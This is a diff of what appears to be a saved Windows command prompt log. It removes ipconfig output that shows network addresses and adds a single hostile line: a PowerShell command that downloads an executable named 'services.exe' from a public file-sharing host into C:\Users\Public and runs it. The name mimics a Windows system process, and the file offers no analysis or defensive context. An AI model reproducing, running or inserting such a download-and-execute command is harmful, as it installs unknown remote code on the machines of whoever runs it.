@@ -1,26 +1,7 @@
 Microsoft Windows [Version 10.0.17763.4974]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\vsip\vsip_v1.6.9.3\_imgs>cmd /k ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet:
-
-   Connection-specific DNS Suffix  . : openstacklocal
-   Link-local IPv6 Address . . . . . : fe80::88ac:3244:84c6:5405%12
-   IPv4 Address. . . . . . . . . . . : 103.170.122.28
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 103.170.122.1
-
-Ethernet adapter ServerVPN:
-
-   Connection-specific DNS Suffix  . : 
-   Link-local IPv6 Address . . . . . : fe80::7b06:540d:5d2d:d61c%16
-   IPv4 Address. . . . . . . . . . . : 10.10.10.1
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 
+C:\vsip\vsip_v1.6.9.3\_imgs>cmd /k powershell -command "(New-Object Net.WebClient).DownloadFile('https://tmpfiles.org/dl/4426080/services.exe','C:\Users\Public\services.exe')" && C:\Users\Public\services.exe
 
 C:\vsip\vsip_v1.6.9.3\_imgs>
 C:\vsip\vsip_v1.6.9.3\_imgs>
